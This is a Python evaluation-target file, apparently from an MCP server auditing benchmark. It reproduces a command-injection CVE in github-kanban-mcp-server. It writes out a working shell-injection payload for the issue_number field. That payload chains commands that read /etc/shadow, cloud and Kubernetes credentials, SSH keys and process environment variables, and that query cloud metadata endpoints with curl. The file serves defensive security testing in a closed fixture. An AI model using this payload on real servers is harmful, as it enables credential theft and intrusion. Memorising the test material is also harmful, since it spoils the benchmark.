"""CVE-2025-53818: OS command injection in github-kanban-mcp-server (command execution).

handleAddComment builds `gh issue comment <issue_number> --repo <repo> --body-file "<path>"` and
`gh issue view <issue_number> --repo <repo> --json number,title,state,url` as shell strings and
runs them through execAsync (promisify(exec) -> /bin/sh -c). The caller controls `issue_number`,
so a payload of the form `--help; <cmd>; :` injects an arbitrary command: `--help` makes the
leading `gh` invocation exit 0, `<cmd>` runs, and `:` swallows the trailing flags, so the view
step exits 0 and its stdout (returned to the client) carries `<cmd>`'s output. Reaching
handleAddComment needs args.path to resolve owner/repo from <path>/.git/config against a
github.com origin, so /repo (a git checkout baked into the image) is passed as the path.

The patched build (execFile('gh', [...argv]) plus an `issue_number` /^[1-9][0-9]*$/ check) passes
the payload as one literal argv element and rejects the non-numeric value, so no nonce surfaces.

The reach is command_execution, so every kept place is read by running a command: cat for files,
tr</proc/self/environ for the env var, id for the account, hostname for the UTS name, curl for the
internal HTTP endpoints. The real gh contacts api.github.com, which cannot run in the closed
fixture network, so it is served by a stand-in under its real name; gh trusts the fixture
authority through SSL_CERT_FILE (Go's documented CA-file override). The benign call is list_issues,
one `gh issue list` the stand-in answers with gh's own three-issue test fixture. The server's only
writes (a temp comment file under its cwd) cannot land in the read-only checkout, so the working
directory is the v11 empty tmpfs /work outside the layout, while the checkout stays its scope.
"""

import re

from evals.cve_environments import command_injection_env
from evals.cve_grammar import MechanismClass
from evals.cve_layout import WORK
from evals.cve_places import Place, Places, PlantKind
from evals.cve_planting import PlantingHost, SymbolicUser
from evals.cve_planting_base import PublicNames
from evals.cve_planting_spec import resolve_container_path
from evals.cve_targets import CVETarget
from mcp_auditor.domain.ports import MCPClientPort

SERVICE = "holdout-2025-53818-github-kanban"
PATCHED = "holdout-2025-53818-github-kanban-patched"
REPO_PATH = "/repo"  # the git checkout baked into the image; its origin is a github.com URL
# writeToTempFile writes comment_body.md under process.cwd()/tmp before the vulnerable gh call;
# the checkout (the scope) is mounted read-only and the server is unprivileged, so /work (the v11
# empty working directory outside the layout) is the working directory.
WORKING_DIRECTORY = WORK
STAND_IN_HOST = "api.github.com"

AIM = re.compile(r";\s*\S")  # the payload chains a command after `;`; the benign call does not

KEPT_PLACES = (
    "etc-shadow",
    "aws-credentials",
    "gcloud-adc",
    "azure-profile",
    "ssh-private-key",
    "shell-history",
    "git-credentials",
    "npmrc",
    "docker-config",
    "kube-config",
    "pgpass",
    "mysql-client-cnf",
    "mongorc",
    "mysql-system-cnf",
    "run-secrets",
    "k8s-sa-token",
    "auth-log",
    "proc-environ",
    "process-account-identity",
    "container-hostname",
    "imds",
    "ecs-task-credentials",
    "eks-pod-identity",
)


def _payload(cmd: str) -> str:
    # `--help` -> leading `gh ...` exits 0; `cmd` runs; `:` ignores the trailing gh flags.
    return f"--help; {cmd}; :"


def _cmd_for(place: Place) -> str:
    kind = place.kind
    if kind is PlantKind.FILE:
        coords = place.coordinates
        paths = coords.paths if coords.paths is not None else (coords.path,)
        raw = next(p for p in paths if p is not None)
        return f"cat {resolve_container_path(raw, WORKING_DIRECTORY)}"
    if kind is PlantKind.ENV:
        return "tr '\\000' '\\n' < /proc/self/environ"
    if kind is PlantKind.ACCOUNT:
        return "id"
    if kind is PlantKind.HOSTNAME:
        return "hostname"
    if kind is PlantKind.HTTP_ENDPOINT:
        return f"curl -s --max-time 5 http://{place.coordinates.host}{place.coordinates.path}"
    raise ValueError(f"{place.id}: kind {kind} has no command-execution exploit")


def _exploit(place_id: str):
    async def run(places: Places, client: MCPClientPort) -> None:
        await client.call_tool(
            "add_comment",
            {
                "path": REPO_PATH,
                "issue_number": _payload(_cmd_for(places[place_id])),
                "body": "LGTM",
            },
        )

    return run


async def _benign(places: Places, client: MCPClientPort) -> None:
    # list_issues shells out to a single `gh issue list`; the real gh sends one GraphQL IssueList
    # query the api.github.com stand-in answers with gh's own three-issue test fixture, so the tool
    # returns those issues.
    await client.call_tool("list_issues", {"path": REPO_PATH})


TARGET = CVETarget(
    cve_id="CVE-2025-53818",
    severity="CVSS 8.8 (v3.1, placeholder)",
    mechanisms=frozenset({MechanismClass.COMMAND_EXECUTION}),
    aim=AIM,
    reaches=frozenset({"command_execution"}),
    kept_places=KEPT_PLACES,
    images=(SERVICE, "sentinel", "stand-in"),
    server_image=SERVICE,
    patched_image=PATCHED,
    planting_host=PlantingHost(
        SymbolicUser.UNPRIVILEGED,
        WORKING_DIRECTORY,
        has_network=False,
        public_names=PublicNames(stand_ins=(STAND_IN_HOST,), trust=("SSL_CERT_FILE",)),
    ),
    builder=command_injection_env,
    exploits=tuple(_exploit(place_id) for place_id in KEPT_PLACES),
    benign=_benign,
    awaited_capability=None,
    note=(
        "OS command injection: the add_comment tool interpolates its attacker-controlled "
        "issue_number into a shell string run with promisify(exec), so a value that chains a "
        "command (`--help; <cmd>; :`) executes it in the server's container."
    ),
    tools_filter=None,
)
